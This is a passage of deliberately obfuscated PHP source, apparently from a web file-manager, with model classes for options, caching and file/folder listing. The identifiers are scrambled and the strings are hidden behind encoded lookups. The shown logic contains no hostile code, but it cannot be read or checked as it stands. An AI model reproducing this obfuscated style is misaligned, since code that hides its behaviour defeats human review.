$this->listData($œ³ÜüÜÜ); if (!$‚Ãİ‰õ || !$œ³ÜüÜÜ) { return !1; } $¹¼¹œÎë = array_merge($‚Ãİ‰õ, $¹¼¹œÎë); $¹¼¹œÎë[$ÕãĞ[95]] = time(); return Model($this->modelType)->set($ÕãĞ[434] . $œ³ÜüÜÜ, $¹¼¹œÎë, $this->optionType); } public function remove($ËÙåòš) { if (!$ËÙåòš) { return !1; } return Model($this->modelType)->remove($_SERVER[¹òÍ›æş][434] . $ËÙåòš, $this->optionType); } public function clear() { $øÙ“Ü•è =& $_SERVER[¹òÍ›æş]; Model($this->modelType)->remove($øÙ“Ü•è[435], $this->optionType . $øÙ“Ü•è[436]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($øÒñ«‚¦, $ÜÔ·ğÑ) { if (!$ÜÔ·ğÑ) { return !1; } $ôˆü¾ùÃ = $this->listData(); $ôˆü¾ùÃ = array_to_keyvalue($ôˆü¾ùÃ, $øÒñ«‚¦); return isset($ôˆü¾ùÃ[$ÜÔ·ğÑ]) ? $ôˆü¾ùÃ[$ÜÔ·ğÑ] : !1; } public function findByName($€èº˜Ç) { return $this->findByKey($_SERVER[¹òÍ›æş][32], $€èº˜Ç); } protected function resetData($ø§àõÎ‡) { $·ä•Ë–– =& $_SERVER[¹òÍ›æş]; $ø§àõÎ‡ = is_array($ø§àõÎ‡) ? $ø§àõÎ‡ : array(); $ÛûŸÜê = array(); for ($Šæ¡€’ = 0; $Šæ¡€’ < count($ø§àõÎ‡); $Šæ¡€’++) { $ÛûŸÜê[$·ä•Ë––[434] . $ø§àõÎ‡[$Šæ¡€’][$·ä•Ë––[437]]] = $ø§àõÎ‡[$Šæ¡€’]; } return Model($this->modelType)->set($ÛûŸÜê, !1, $this->optionType); } private function getAutoName($ÅÕ¥òÉĞ) { $ù™¯ı÷å = array_to_keyvalue($this->listData(), $_SERVER[¹òÍ›æş][32]); if (!$ù™¯ı÷å || !isset($ù™¯ı÷å[$ÅÕ¥òÉĞ])) { return $ÅÕ¥òÉĞ; } for ($´ø˜¿¹À = 1; $´ø˜¿¹À < count($ù™¯ı÷å); $´ø˜¿¹À++) { $ÅëÁÄûµ = $ÅÕ¥òÉĞ . "\x28{$´ø˜¿¹À}\51"; if (!isset($ù™¯ı÷å[$ÅëÁÄûµ])) { return $ÅëÁÄûµ; } } return $ÅëÁÄûµ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($´¹¦®ğ = false, $¯–‰ğ¤Ë = '', $£’Ñœâ¢ = false) { $­ïÓ¨¡ =& $_SERVER[¹òÍ›æş]; $×áÚ‡Ä = $this->cacheGet($¯–‰ğ¤Ë); $ÑÌìâ—ï = $this->optionDefault($¯–‰ğ¤Ë); $ÑÌìâ—ï = is_array($ÑÌìâ—ï) ? $ÑÌìâ—ï : array(); if (is_array($×áÚ‡Ä)) { $×áÚ‡Ä = array_merge($ÑÌìâ—ï, $×áÚ‡Ä); return $´¹¦®ğ ? isset($×áÚ‡Ä[$´¹¦®ğ]) ? $×áÚ‡Ä[$´¹¦®ğ] : null : $×áÚ‡Ä; } $ŸŒø¼«Ì = $this->filterWhere(array($­ïÓ¨¡[33] => $¯–‰ğ¤Ë)); $×áÚ‡Ä = $this->where($ŸŒø¼«Ì)->select(); $×áÚ‡Ä = array_to_keyvalue($×áÚ‡Ä, $­ïÓ¨¡[104], $­ïÓ¨¡[412]); foreach ($×áÚ‡Ä as $½¿Âøï— => $¤êıÍñ) { if ($£’Ñœâ¢ || in_array($½¿Âøï—, $this->jsonField)) { $×áÚ‡Ä[$½¿Âøï—] = json_decode($¤êıÍñ, !0); } } $this->cacheSet($¯–‰ğ¤Ë, $×áÚ‡Ä); $×áÚ‡Ä = array_merge($ÑÌìâ—ï, $×áÚ‡Ä); return $´¹¦®ğ ? $×áÚ‡Ä[$´¹¦®ğ] : $×áÚ‡Ä; } public function set($©Ê°ØÉå, $É†÷Ôˆ‡ = false, $¥é¢¡à¢ = '') { $Ëøûƒà• =& $_SERVER[¹òÍ›æş]; $this->cacheRemove($¥é¢¡à¢); $–õ×µ¾ = array(); $ş†Š²¾ = is_array($©Ê°ØÉå) ? $©Ê°ØÉå : array($©Ê°ØÉå => $É†÷Ôˆ‡); foreach ($ş†Š²¾ as $€ß»†’Â => $ÙÓ‹Ç‡±) { if (is_array($ÙÓ‹Ç‡±)) { $ÙÓ‹Ç‡± = json_encode_force($ÙÓ‹Ç‡±); } $this->checkLength($ÙÓ‹Ç‡±, !1, $this->tableName . $Ëøûƒà•[4] . $©Ê°ØÉå); $ÙÓ‹Ç‡± = self::textEncode($ÙÓ‹Ç‡±); $ş†Š²¾ = array($Ëøûƒà•[33] => $¥é¢¡à¢, $Ëøûƒà•[104] => $€ß»†’Â, $Ëøûƒà•[412] => $ÙÓ‹Ç‡±); $–õ×µ¾[] = $this->filterWhere($ş†Š²¾); } if (!$–õ×µ¾) { return !0; } $«‡ƒ–Ÿ = $this->cacheKey($Ëøûƒà•[438]); CacheLock::lock($«‡ƒ–Ÿ); $¯½ÇÈ’» = $this->addAll($–õ×µ¾, array(), !0); CacheLock::unlock($«‡ƒ–Ÿ); return $¯½ÇÈ’»; } protected function optionDefault($”ÉŠàäŸ = '') { return !1; } public function setDeep($‘Ÿà­Ó÷, $¤÷•¥…Î = false, $ÉŸ¤¶çÒ = '') { $«åäƒ«İ = explode($_SERVER[¹òÍ›æş][10], $‘Ÿà­Ó÷); $°ü„¹µş = $this->get(); array_set_value($°ü„¹µş, $‘Ÿà­Ó÷, $¤÷•¥…Î); $this->set($«åäƒ«İ[0], $°ü„¹µş[$«åäƒ«İ[0]], $ÉŸ¤¶çÒ); } public function remove($æ‡™ş¢, $ŸĞøñœÏ = '') { $¾‘ŠòÕ„ =& $_SERVER[¹òÍ›æş]; $this->cacheRemove($ŸĞøñœÏ); $ñƒÕù…Ï = $this->filterWhere(array($¾‘ŠòÕ„[104] => $æ‡™ş¢, $¾‘ŠòÕ„[33] => $ŸĞøñœÏ)); if (is_null($æ‡™ş¢)) { unset($ñƒÕù…Ï[$¾‘ŠòÕ„[104]]); } return $this->where($ñƒÕù…Ï)->delete(); } public function cacheSet($£º÷´åÌ, $£Ùêœ²û = false) { return Cache::set($this->cacheKey($£º÷´åÌ), $£Ùêœ²û); } public function cacheGet($ ›£ôü‘) { return Cache::get($this->cacheKey($ ›£ôü‘)); } public function cacheRemove($É²…èĞç) { return Cache::remove($this->cacheKey($É²…èĞç)); } protected function filterWhere($ÖæØµâ) { return $ÖæØµâ; } protected function cacheKey($û²Å›—) { return $û²Å›—; } } class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\157\x75\162\143\145"; protected $tableMeta = array("\164\x61\x62\154\145\116\141\x6d\x65" => "\151\157\137\163\x6f\165\162\x63\x65\x5f\155\x65\164\141", "\155\145\x74\x61\x46\x69\145\x6c\144" => "\163\x6f\x75\x72\x63\145\111\x44"); protected $dataAuto = array(array("\155\157\x64\151\x66\x79\124\x69\x6d\145", "\164\151\155\x65", "\x69\x6e\163\145\162\164", "\x66\165\156\143\x74\151\157\156"), array("\x63\x72\x65\x61\164\145\124\x69\155\x65", "\x74\x69\155\x65", "\x69\x6e\163\x65\x72\164", "\146\165\156\x63\x74\151\x6f\156"), array("\166\151\x65\167\124\151\155\145", "\164\151\x6d\x65", "\151\156\x73\x65\162\164", "\x66\165\156\x63\x74\151\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($ÒÌœì‡ª) { return $this->listSource(array($_SERVER[¹òÍ›æş][439] => $ÒÌœì‡ª)); } public function typeName($ù¥Ö²ºå) { static $îÅÜ”™ = array(self::TYPE_SYSTEM => "\163\171\163\x74\x65\x6d", self::TYPE_USER => "\x75\163\145\x72", self::TYPE_GROUP => "\x67\162\157\x75\x70"); return $îÅÜ”™[$ù¥Ö²ºå . $_SERVER[¹òÍ›æş][12]]; } public function sourceListInfo($­£Ãì¨û, $ÁâÉá×¾ = false) { $¡”¡ÅÊ =& $_SERVER[¹òÍ›æş]; $­£Ãì¨û = $­£Ãì¨û ? $­£Ãì¨û : array(); $­£Ãì¨û = array_filter(array_unique($­£Ãì¨û)); if (!$­£Ãì¨û) { return array(); } $í½¢Ô¦õ = $this->where(array($¡”¡ÅÊ[440] => array($¡”¡ÅÊ[7], $­£Ãì¨û)))->select(); $this->_listDataApply($í½¢Ô¦õ, $ÁâÉá×¾); return array_to_keyvalue($í½¢Ô¦õ, $¡”¡ÅÊ[440]); } public function pathInfoFilter(&$Ã¦°ìœô) { $éøÒ»¯Û =& $_SERVER[¹òÍ›æş]; static $¢õ¶úÍ¿ = false; static $©ø€Ä‹§ = false; static $˜Ïá¯ = false; if (!$¢õ¶úÍ¿) { $Ÿô™Ã÷ô = $éøÒ»¯Û[441]; $Ÿô™Ã÷ô .= $éøÒ»¯Û[442]; $Ÿô™Ã÷ô .= $éøÒ»¯Û[443]; $î†Ø×ê” = $éøÒ»¯Û[444]; $©Ó²ßÅ× = explode($éøÒ»¯Û[50], $î†Ø×ê”); $¢õ¶úÍ¿ = explode($éøÒ»¯Û[50], $Ÿô™Ã÷ô); $©ø€Ä‹§ = array(); foreach ($¢õ¶úÍ¿ as $âÖøò¢¹) { if (in_array($âÖøò¢¹, $©Ó²ßÅ×)) { continue; } $©ø€Ä‹§[] = $âÖøò¢¹; } $˜Ïá¯ = explode($éøÒ»¯Û[50], $éøÒ»¯Û[445]); } foreach ($˜Ïá¯ as $Ê“µÀÛ) { if (isset($Ã¦°ìœô[$Ê“µÀÛ])) { $Ã¦°ìœô[$Ê“µÀÛ] = intval($Ã¦°ìœô[$Ê“µÀÛ]); } } $Ã¦°ìœô[$éøÒ»¯Û[94]] = $éøÒ»¯Û[446] . $Ã¦°ìœô[$éøÒ»¯Û[440]] . $éøÒ»¯Û[447]; $Ã¦°ìœô[$éøÒ»¯Û[33]] = $Ã¦°ìœô[$éøÒ»¯Û[448]] == 1 ? $éøÒ»¯Û[85] : $éøÒ»¯Û[210]; $Ã¦°ìœô[$éøÒ»¯Û[449]] = $this->typeName($Ã¦°ìœô[$éøÒ»¯Û[449]]); if ($Ã¦°ìœô[$éøÒ»¯Û[448]] != 1) { $Ã¦°ìœô[$éøÒ»¯Û[184]] = $Ã¦°ìœô[$éøÒ»¯Û[450]]; unset($Ã¦°ìœô[$éøÒ»¯Û[450]]); } $áŒ²µ‰¸ = $¢õ¶úÍ¿; if (isset($Ã¦°ìœô[$éøÒ»¯Û[451]]) && $Ã¦°ìœô[$éøÒ»¯Û[451]][$éøÒ»¯Û[452]] == -1) { $áŒ²µ‰¸ = $©ø€Ä‹§; } $Ã¦°ìœô = array_field_key($Ã¦°ìœô, $áŒ²µ‰¸); return $Ã¦°ìœô; } public function listUserFav() { $ÏÚ¨Şµº =& $_SERVER[¹òÍ›æş]; $„©‰’ó = Model($ÏÚ¨Şµº[453])->listData(); $àáıó æ = array_filter_by_field($„©‰’ó, $ÏÚ¨Şµº[33], $ÏÚ¨Şµº[454]); $àáıó æ = array_to_keyvalue($àáıó æ, $ÏÚ¨Şµº[12], $ÏÚ¨Şµº[94]); if ($àáıó æ) { $•“Ÿ÷ÅÇ = $this->listSource(array($ÏÚ¨Şµº[455] => array($ÏÚ¨Şµº[456], $àáıó æ))); } $•“Ÿ÷ÅÇ = array_to_keyvalue($•“Ÿ÷ÅÇ[$ÏÚ¨Şµº[407]], $ÏÚ¨Şµº[440]); foreach ($„©‰’ó as &$ˆ§¹‰£) { $ˆ§¹‰£ = array($ÏÚ¨Şµº[457] => $ˆ§¹‰£[$ÏÚ¨Şµº[437]], $ÏÚ¨Şµº[458] => $ˆ§¹‰£[$ÏÚ¨Şµº[32]], $ÏÚ¨Şµº[459] => $ˆ§¹‰£[$ÏÚ¨Şµº[94]], $ÏÚ¨Şµº[460] => $ˆ§¹‰£[$ÏÚ¨Şµº[33]], $ÏÚ¨Şµº[461] => $ˆ§¹‰£[$ÏÚ¨Şµº[211]], $ÏÚ¨Şµº[462] => $ˆ§¹‰£[$ÏÚ¨Şµº[95]]); if ($ˆ§¹‰£[$ÏÚ¨Şµº[33]] == $ÏÚ¨Şµº[454] && $•“Ÿ÷ÅÇ[$ˆ§¹‰£[$ÏÚ¨Şµº[94]]]) { $ˆ§¹‰£[$ÏÚ¨Şµº[97]] = $•“Ÿ÷ÅÇ[$ˆ§¹‰£[$ÏÚ¨Şµº[94]]]; } } unset($ˆ§¹‰£); return $„©‰’ó; } public function listUserTag($ Ì¶ôæŞ) { $ÕÖ°“×ç =& $_SERVER[¹òÍ›æş]; if ($ Ì¶ôæŞ && !is_array($ Ì¶ôæŞ)) { $ Ì¶ôæŞ = array($ Ì¶ôæŞ); } $—üíÂŠü = Model($ÕÖ°“×ç[463])->listData(); $Øø˜³–Õ = array(); $¬¡¤Õ–İ = array(); foreach ($—üíÂŠü as $Ñ‹×£ôé) { $­¹Š€à = $Ñ‹×£ôé[$ÕÖ°“×ç[94]]; if (!$­¹Š€à) { continue; } if (!isset($¬¡¤Õ–İ[$­¹Š€à])) { $¬¡¤Õ–İ[$­¹Š€à] = array(); } $¬¡¤Õ–İ[$­¹Š€à][] = $Ñ‹×£ôé[$ÕÖ°“×ç[464]]; $Øø˜³–Õ[$Ñ‹×£ôé[$ÕÖ°“×ç[94]]] = $Ñ‹×£ôé; } $îàÚëÌÑ = array(); $¯É‘À = array(); $¡’¦­ûÀ = array(); foreach ($¬¡¤Õ–İ as $ï‘™©Æü => $ÅŠ¡½Â) { $ê™û¨Ş = !0; if (!$ Ì¶ôæŞ) { $îàÚëÌÑ[] = $ï‘™©Æü; continue; } foreach ($ Ì¶ôæŞ as $ÂÖüÚä”) { if (!in_array($ÂÖüÚä”, $ÅŠ¡½Â)) { $ê™û¨Ş = !1; break; } } if (!$ê™û¨Ş) { continue; } if (!is_numeric($ï‘™©Æü)) { $ã¾«ÙôÈ = $Øø˜³–Õ[$ï‘™©Æü]; $•ü»ú = array($ÕÖ°“×ç[32] => $ã¾«ÙôÈ[$ÕÖ°“×ç[32]], $ÕÖ°“×ç[94] => $ã¾«ÙôÈ[$ÕÖ°“×ç[94]], $ÕÖ°“×ç[33] => $ã¾«ÙôÈ[$ÕÖ°“×ç[33]], $ÕÖ°“×ç[97] => array($ÕÖ°“×ç[465] => 1), $ÕÖ°“×ç[212] => !0); if ($ã¾«ÙôÈ[$ÕÖ°“×ç[33]] == $ÕÖ°“×ç[210]) { $¡’¦­ûÀ[] = $•ü»ú; } if ($ã¾«ÙôÈ[$ÕÖ°“×ç[33]] == $ÕÖ°“×ç[85]) { $¯É‘À[] = $•ü»ú; } continue; } $îàÚëÌÑ[] = $ï‘™©Æü; } if ($îàÚëÌÑ) { $ˆßç©îˆ = $this->listSource(array($ÕÖ°“×ç[455] => array($ÕÖ°“×ç[456], $îàÚëÌÑ))); } $ˆßç©îˆ = $ˆßç©îˆ ? $ˆßç©îˆ : array($ÕÖ°“×ç[92] => array(), $ÕÖ°“×ç[93] => array()); $ˆßç©îˆ[$ÕÖ°“×ç[92]] = array_merge($ˆßç©îˆ[$ÕÖ°“×ç[92]], $¯É‘À); $ˆßç©îˆ[$ÕÖ°“×ç[93]] = array_merge($ˆßç©îˆ[$ÕÖ°“×ç[93]], $¡’¦­ûÀ); if (isset($ˆßç©îˆ[$ÕÖ°“×ç[404]]) && count($îàÚëÌÑ) == $ˆßç©îˆ[$ÕÖ°“×ç[404]][$ÕÖ°“×ç[405]]) { return $ˆßç©îˆ; } $¯ÍÈã¦ = array(); $¨£»Á¶ü = array_to_keyvalue($ˆßç©îˆ[$ÕÖ°“×ç[92]], $ÕÖ°“×ç[12], $ÕÖ°“×ç[440]); $ ŞÀ‹ì = array_to_keyvalue($ˆßç©îˆ[$ÕÖ°“×ç[93]], $ÕÖ°“×ç[12], $ÕÖ°“×ç[440]); $¼±…ıìº = array_merge($ ŞÀ‹ì, $¨£»Á¶ü); foreach ($îàÚëÌÑ as $­¹Š€à) { if (!in_array($­¹Š€à, $¼±…ıìº)) { $¯ÍÈã¦[] = $­¹Š€à; } } if ($¯ÍÈã¦) { Model($ÕÖ°“×ç[466])->removeBySource($¯ÍÈã¦); } return $ˆßç©îˆ; } public function listUserRecycle() { $ªĞÇ¹˜ =& $_SERVER[¹òÍ›æş]; $ßŸÅ÷Ÿæ = Model($ªĞÇ¹˜[467])->listData(); if (!$ßŸÅ÷Ÿæ) { return array(); } $ãş«õ¿ = array($ªĞÇ¹˜[455] => array($ªĞÇ¹˜[456], $ßŸÅ÷Ÿæ), $ªĞÇ¹˜[468] => 1); return $this->listSource($ãş«õ¿); } public function listSource($Ä˜Øı¸Ø, $”£ŒñÊ = 3000, $™äÄ÷á¶ = false) { $œÄ†ªá =& $_SERVER[¹òÍ›æş]; if (!isset($Ä˜Øı¸Ø[$œÄ†ªá[469]])) { $Ä˜Øı¸Ø[$œÄ†ªá[469]] = 0; } if (isset($Ä˜Øı¸Ø[$œÄ†ªá[470]]) && $Ä˜Øı¸Ø[$œÄ†ªá[470]] == $œÄ†ªá[208]) { $Ä˜Øı¸Ø[$œÄ†ªá[450]] = array($œÄ†ªá[369], $œÄ†ªá[471]); } $Œ¤òĞ‘‡ = $œÄ†ªá[472]; $ë›´©òİ = $this->field($Œ¤òĞ‘‡)->_makeOrder()->where($Ä˜Øı¸Ø)->selectPage($”£ŒñÊ); $this->_listPageCheck($ë›´©òİ, $Œ¤òĞ‘‡, $Ä˜Øı¸Ø); $this->_listDataApply($ë›´©òİ[$œÄ†ªá[407]], $™äÄ÷á¶); $this->_listMake($ë›´©òİ); return $ë›´©òİ; } private function _listPageCheck(&$£Ê²“‚â, $¸¹¸ˆ¬, $çÌô¯ôå) { $ÃÖÖ–ß½ =& $_SERVER[¹òÍ›æş]; if (!is_array($£Ê²“‚â[$ÃÖÖ–ß½[404]])) { return; } $£äş‚ùë = $£Ê²“‚â[$ÃÖÖ–ß½[404]]; if ($£äş‚ùë[$ÃÖÖ–ß½[406]] <= 1) { return; } if ($£äş‚ùë[$ÃÖÖ–ß½[405]] >= 100000) { return; } if (Model($ÃÖÖ–ß½[473])->get($ÃÖÖ–ß½[474]) != $ÃÖÖ–ß½[475]) { return; } $¸¹¸ˆ¬ = str_replace(array($ÃÖÖ–ß½[53], $ÃÖÖ–ß½[380], $ÃÖÖ–ß½[59]), $ÃÖÖ–ß½[12], $¸¹¸ˆ¬); $¸¹¸ˆ¬ = $ÃÖÖ–ß½[476] . str_replace($ÃÖÖ–ß½[50], $ÃÖÖ–ß½[477], $¸¹¸ˆ¬) . $ÃÖÖ–ß½[478]; $Öè¾åå· = $ÃÖÖ–ß½[479]; $Öè¾åå· = $Öè¾åå· . $ÃÖÖ–ß½[480]; $¶ïÁÔ¾ì = $£äş‚ùë[$ÃÖÖ–ß½[401]] * ($£äş‚ùë[$ÃÖÖ–ß½[391]] - 1) . $ÃÖÖ–ß½[50] . $£äş‚ùë[$ÃÖÖ–ß½[401]]; $‚°Şè¿ğ = $this->_makeOrder(!0); $É²¼˜ÖË = $ÃÖÖ–ß½[476] . str_replace($ÃÖÖ–ß½[50], $ÃÖÖ–ß½[477], $‚°Şè¿ğ[0]); if (strpos($É²¼˜ÖË, $ÃÖÖ–ß½[481])) { $É²¼˜ÖË = str_replace($ÃÖÖ–ß½[481], $ÃÖÖ–ß½[482], $É²¼˜ÖË); } else { $É²¼˜ÖË .= $ÃÖÖ–ß½[483] . $‚°Şè¿ğ[1]; } $“øœ° = array(); foreach ($çÌô¯ôå as $†°—¥½« => $¹…ÈÊê·) { $“øœ°[$ÃÖÖ–ß½[476] . $†°—¥½«] = $¹…ÈÊê·; } $this->alias($ÃÖÖ–ß½[484])->field($¸¹¸ˆ¬)->limit($¶ïÁÔ¾ì)->order($É²¼˜ÖË); $ÓöÊ›¢æ = $this->join($Öè¾åå·)->where($“øœ°)->select(); if ($ÓöÊ›¢æ) { $£Ê²“‚â[$ÃÖÖ–ß½[407]] = $ÓöÊ›¢æ; } } protected function _makeOrder($åé®…á‘ = false) { $†õ†Õ–² =& $_SERVER[¹òÍ›æş]; $ê°êˆç = Model($†õ†Õ–²[485])->get($†õ†Õ–²[486]); $Á®¿úÍå = Model($†õ†Õ–²[485])->get($†õ†Õ–²[487]); $±ÖÙàœ¸ = array($†õ†Õ–²[488] => $†õ†Õ–²[489], $†õ†Õ–²[490] => $†õ†Õ–²[491]); $ ËƒÆûÊ = array($†õ†Õ–²[32] => $†õ†Õ–²[32], $†õ†Õ–²[86] => $†õ†Õ–²[86], $†õ†Õ–²[184] => $†õ†Õ–²[450], $†õ†Õ–²[492] => $†õ†Õ–²[492], $†õ†Õ–²[493] => $†õ†Õ–²[494], $†õ†Õ–²[211] => $†õ†Õ–²[211], $†õ†Õ–²[95] => $†õ†Õ–²[95]); $¿Î¢“—€ = Input::get($†õ†Õ–²[495], $†õ†Õ–²[7], $ê°êˆç, array_keys($ ËƒÆûÊ)); $á­ßøûì = Input::get($†õ†Õ–²[496], $†õ†Õ–²[7], $Á®¿úÍå, array_keys($±ÖÙàœ¸)); if (!in_array($¿Î¢“—€, array_keys($ ËƒÆûÊ))) { $¿Î¢“—€ = $†õ†Õ–²[32]; } if (!in_array($á­ßøûì, array_keys($±ÖÙàœ¸))) { $¿Î¢“—€ = $†õ†Õ–²[488]; } if ($¿Î¢“—€ == $†õ†Õ–²[32]) { } $³·îôŞÀ = $†õ†Õ–²[497] . $ ËƒÆûÊ[$¿Î¢“—€] . $†õ†Õ–²[53] . $±ÖÙàœ¸[$á­ßøûì]; $³·îôŞÀ = rtrim(trim($³·îôŞÀ), $†õ†Õ–²[50]); if ($åé®…á‘) { return array($³·îôŞÀ, $±ÖÙàœ¸[$á­ßøûì]); } return $this->order($³·îôŞÀ); } protected function _listDataApplyItem($ø–Åı÷², $»ËÄúƒ = false) { $ÇúÁ¯ñ“ = array($ø–Åı÷²); $this->_listDataApply($ÇúÁ¯ñ“, $»ËÄúƒ); return $ÇúÁ¯ñ“[0]; } protected function _listDataApply(&$‚É¹¢şé, $‚Çæ©úà = false) { $æ–¹„¯‰ =& $_SERVER[¹òÍ›æş]; if (!$‚É¹¢şé) { $‚É¹¢şé = array(); return; } $©•èŞ’š = array_to_keyvalue($‚É¹¢şé, $æ–¹„¯‰[12], $æ–¹„¯‰[440]); $©•èŞ’š = array_unique($©•èŞ’š); $this->_listSourceCache($‚É¹¢şé); if (!$‚Çæ©úà) { $this->_listAppendMeta($‚É¹¢şé, $©•èŞ’š); $this->_listAppendFileMeta($‚É¹¢şé, $©•èŞ’š); $this->_listAppendChildren($‚É¹¢şé, $©•èŞ’š); } $this->_listAppendPath($‚É¹¢şé); $this->_listAppendAuth($‚É¹¢şé); $this->_listAppendSourceInfo($‚É¹¢şé, $©•èŞ’š); $this->_listAppendUser($‚É¹¢şé); $this->_listFilterInfo($‚É¹¢şé, $‚Çæ©úà); $this->_listAppendAuthSecret($‚É¹¢şé); } protected function _listSourceCache($¥£úÔ§Õ) { $ĞØÀÔœö =& $_SERVER[¹òÍ›æş]; foreach ($¥£úÔ§Õ as $ö¬î—í) { self::$cacheSourceInfo[$ĞØÀÔœö[498] . $ö¬î—í[$ĞØÀÔœö[440]]] = $ö¬î—í; } } protected function _listFilterInfo(&$™åÅáß³, $éìÑ×¥Ü = false) { $èë±Øäº =& $_SERVER[¹òÍ›æş]; foreach ($™åÅáß³ as &$´õ÷) { $´õ÷ = $this->pathInfoFilter($´õ÷); self::$cachePathInfo[$èë±Øäº[499] . intval($éìÑ×¥Ü) . $èë±Øäº[424] . $´õ÷[$èë±Øäº[440]]] = $´õ÷; } unset($´õ÷); } protected function _listMake(&$Ó¬ğ±¡Ü) { $œ©­Ñ =& $_SERVER[¹òÍ›æş]; $Ó¬ğ±¡Ü[$œ©­Ñ[92]] = array(); $Ó¬ğ±¡Ü[$œ©­Ñ[93]] = array(); foreach ($Ó¬ğ±¡Ü[$œ©­Ñ[407]] as $ø½«¥å) { $ûÇû£¡í = $ø½«¥å[$œ©­Ñ[448]] == 1 ? $œ©­Ñ[92] : $œ©­Ñ[93]; $Ó¬ğ±¡Ü[$ûÇû£¡í][] = $ø½«¥å; } unset($Ó¬ğ±¡Ü[$œ©­Ñ[407]]); } protected function _listAppendMeta(&$Æ¼×Ê™‚, $÷Òüƒ‡) { $Ó†Œ£ä =& $_SERVER[¹òÍ›æş]; $÷È±×Şè = array($Ó†Œ£ä[455] => array($Ó†Œ£ä[456], $÷Òüƒ‡)); $ñêøšŠ = Model($Ó†Œ£ä[500])->field($Ó†Œ£ä[501])->where($÷È±×Şè)->select(); if (!$ñêøšŠ) { return; } $¢ù›Ëãã = array($Ó†Œ£ä[502], $Ó†Œ£ä[503], $Ó†Œ£ä[482]); $ÄØË·¾¹ = array(); foreach ($ñêøšŠ as $ƒè’§êã) { if (!isset($ÄØË·¾¹[$ƒè’§êã[$Ó†Œ£ä[440]]])) { $ÄØË·¾¹[$ƒè’§êã[$Ó†Œ£ä[440]]] = array(); } if (in_array($ƒè’§êã[$Ó†Œ£ä[104]], $¢ù›Ëãã)) { continue; } $ÄØË·¾¹[$ƒè’§êã[$Ó†Œ£ä[440]]][$ƒè’§êã[$Ó†Œ£ä[104]]] = $ƒè’§êã[$Ó†Œ£ä[412]]; } foreach ($Æ¼×Ê™‚ as &$¦Ò‚Ïœá) { $¦Ò‚Ïœá[$Ó†Œ£ä[504]] = !1; if (isset($ÄØË·¾¹[$¦Ò‚Ïœá[$Ó†Œ£ä[440]]])) { $¦Ò‚Ïœá[$Ó†Œ£ä[504]] = $ÄØË·¾¹[$¦Ò‚Ïœá[$Ó†Œ£ä[440]]]; } if ($this->fileIsLock($¦Ò‚Ïœá) && $¦Ò‚Ïœá[$Ó†Œ£ä[451]]) { $“âé«íï = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $¦Ò‚Ïœá[$Ó†Œ£ä[451]][$Ó†Œ£ä[452]] = AuthModel::authDisable($¦Ò‚Ïœá[$Ó†Œ£ä[451]][$Ó†Œ£ä[452]], $“âé«íï); $¦Ò‚Ïœá[$Ó†Œ£ä[451]][$Ó†Œ£ä[505]][$Ó†Œ£ä[451]] = $¦Ò‚Ïœá[$Ó†Œ£ä[451]][$Ó†Œ£ä[452]]; } } unset($¦Ò‚Ïœá); } protected function _listAppendFileMeta(&$¾öÕÉÅ, $“¿âÅ¶ä) { $’ëüß—Ö =& $_SERVER[¹òÍ›æş]; $äĞÎ×ò = array_to_keyvalue($¾öÕÉÅ, $’ëüß—Ö[12], $’ëüß—Ö[506]); $äĞÎ×ò = array_filter(array_unique($äĞÎ×ò)); if (!$äĞÎ×ò) { return; } $Ğïó¶• = array($’ëüß—Ö[507] => array($’ëüß—Ö[456], $äĞÎ×ò)); $¶®Ã¡ÙÍ = $’ëüß—Ö[508]; $åÛ‘ùœ¹ = Model($’ëüß—Ö[509])->field($¶®Ã¡ÙÍ)->where($Ğïó¶•)->select(); $åÛ‘ùœ¹ = array_to_keyvalue($åÛ‘ùœ¹, $’ëüß—Ö[506]); $³ÇÆ‘•œ = Model($’ëüß—Ö[510])->field($’ëüß—Ö[511])->where($Ğïó¶•)->select(); $³ÇÆ‘•œ = $³ÇÆ‘•œ ? $³ÇÆ‘•œ : array(); $ßøŒïøÍ = array(); foreach ($³ÇÆ‘•œ as $âÜ¶úÆ‰) { if (!isset($ßøŒïøÍ[$âÜ¶úÆ‰[$’ëüß—Ö[506]]])) { $ßøŒïøÍ[$âÜ¶úÆ‰[$’ëüß—Ö[506]]] = array(); } $ßøŒïøÍ[$âÜ¶úÆ‰[$’ëüß—Ö[506]]][$âÜ¶úÆ‰[$’ëüß—Ö[104]]] = $âÜ¶úÆ‰[$’ëüß—Ö[412]]; } foreach ($¾öÕÉÅ as &$­“ôåùĞ) { $üâ´”æÌ = $­“ôåùĞ[$’ëüß—Ö[506]]; if (!$üâ´”æÌ || !is_array($åÛ‘ùœ¹[$üâ´”æÌ])) { continue; } $¦°À¸ş = $åÛ‘ùœ¹[$üâ´”æÌ]; $¦°À¸ş[$’ëüß—Ö[86]] = $­“ôåùĞ[$’ëüß—Ö[86]]; $¦°À¸ş[$’ëüß—Ö[32]] = $­“ôåùĞ[$’ëüß—Ö[32]]; if (!isset(self::$cacheFileInfo[$’ëüß—Ö[512] . $üâ´”æÌ])) { self::$cacheFileInfo[$’ëüß—Ö[512] . $üâ´”æÌ] = array_merge(array(), $¦°À¸ş); } unset($åÛ‘ùœ¹[$üâ´”æÌ][$’ëüß—Ö[94]]); $€ÓÆàòâ = is_array($ßøŒïøÍ[$üâ´”æÌ]) ? $ßøŒïøÍ[$üâ´”æÌ] : array(); $­“ôåùĞ[$’ëüß—Ö[180]] = array_merge($€ÓÆàòâ, $åÛ‘ùœ¹[$üâ´”æÌ]); if (isset($­“ôåùĞ[$’ëüß—Ö[180]][$’ëüß—Ö[179]])) { $­“ôåùĞ[$’ëüß—Ö[179]] = json_decode($­“ôåùĞ[$’ëüß—Ö[180]][$’ëüß—Ö[179]], !0); unset($­“ôåùĞ[$’ëüß—Ö[180]][$’ëüß—Ö[179]]); } } unset($­“ôåùĞ); } protected function _listAppendSourceInfo(&$ß¢Ö£İ†, $ƒû—²) { $Ÿ÷ñîß¾ =& $_SERVER[¹òÍ›æş]; $©ïÜÑùÀ = Model($Ÿ÷ñîß¾[513])->listData(); $âö·¡²ø = Model($Ÿ÷ñîß¾[463])->listData(); 